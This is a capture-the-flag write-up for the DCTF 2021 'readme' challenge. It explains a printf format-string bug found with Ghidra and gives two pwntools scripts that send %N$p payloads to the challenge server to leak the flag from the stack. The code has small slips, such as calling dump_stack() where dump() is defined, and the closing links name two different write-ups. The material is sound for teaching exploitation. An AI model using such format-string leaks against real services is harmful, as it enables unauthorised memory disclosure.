Preface  
-------

We get a binary which asks for our name and then prints hello + input.  
But in order for the binary to run, a file ```flag.txt``` needs to be created
in the working directoy.

Overview  
--------

Decompiling the binary in *ghidra*, we see a function ```vuln``` where the
logic happens.  
The decompiled function with some renaming of the variables looks like this:

```C  
void vuln(void) {  
 FILE *flag_file;  
 long in_FS_OFFSET;  
 char flag [32];  
 char name [40];  
 long local_10;  
  
 stack_canary = *(long *)(in_FS_OFFSET + 40);  
 flag_file = fopen("flag.txt","r");  
 fgets(local_58,28,flag_file);  
 fclose(flag_file);  
 puts("hello, what\'s your name?");  
 fgets(name,30,stdin);  
 printf("hello ");  
 printf(name);  
 if (stack_canary != *(long *)(in_FS_OFFSET + 40)) {  
   __stack_chk_fail();  
 }  
 return;  
}  
```

From this we can see, that the flag is read and stored in the function stack
frame.  
Also we can see, that our input (_name_) is directly passed to ```printf```,
so we got a format string possibility.

With ```%p``` we can print values from the memory and with ```%1$p``` we can
also add an offset, to what memory we want to print.

Using this I played a little bit around with offsets, until I saw the hex for
the flag in the output.  
During the CTF my exploit was pretty simple.

```Python  
#!/usr/bin/env python3  
from pwn import *

context.arch = 'amd64'  
context.log_level = "INFO"

context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

vulnerable = './readme'

payload = ""

for i in range(1,20):  
   #p = process( vulnerable )  
   p = remote('dctf-chall-readme.westeurope.azurecontainer.io', 7481)  
   p.readuntil('hello, what\'s your name?')  
   p.sendline("%{}$p.".format(i))  
   p.readuntil('hello ')  
   leak = p.read(2048, timeout=1).strip().split(b'.')  
   for item in leak:  
       try:  
log.info(p64(int(item, 16)))  
       except:  
           continue  
   p.close()  
```

This already gave me almost the flag. Because I had to extend a closing
bracket at the end of it.

After the CTF ended, I extended my Script, to be more efficient, because I
could input multiple formats up to 30 characters.  
Also I want to have a function to dump the memory, in order to extend the
size.  
Also the leaked memory was combined and then printed our, this way the flag
was more obvious.

```Python  
#!/usr/bin/env python3  
from pwn import *

context.arch = 'amd64'  
context.log_level = "INFO"

context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

vulnerable = './readme'

payload = ""

def send_payload(fmtstr):  
   global payload  
   if len(payload) + len(fmtstr) >= 30:  
       #p = process( vulnerable )  
       p = remote('dctf-chall-readme.westeurope.azurecontainer.io', 7481)  
       p.readuntil('hello, what\'s your name?')  
       p.sendline(payload)  
       p.readuntil('hello ')  
       leak = p.read(2048, timeout=1).strip().strip(b';').split(b';')  
       p.close()  
       payload = fmtstr  
       return leak  
   else:  
       payload += fmtstr  
       return []

def dump(num_bytes_leaked=20):  
   leaks = []  
   for i in range(num_bytes_leaked):  
       leaks.extend(send_payload("%{}$p;".format(1+i)))  
   stack_leak = map(lambda y: 0 if b'nil' in y else int(y, 16), leaks)  
   return stack_leak

sl = dump_stack()  
slb = b''.join(map(p64, sl))  
log.info(hexdump(slb))

x = slb[slb.find(b'dctf{'):]  
x = x[:(x.find(b'\x00'))]  
log.info('flag is: ' + x.decode('ASCII') + '}')  
```

The complete flag was:  
```dctf{n0w_g0_r3ad_s0me_b00k5}```

Original writeup (https://w0y.at/writeup/2021/05/17/dctf-2021-readme.html).[Original
writeup](https://t3l3sc0p3.github.io/posts/knightctf-2024-writeup/#readme-305-pts)
(https://t3l3sc0p3.github.io/posts/knightctf-2024-writeup/#readme-305-pts).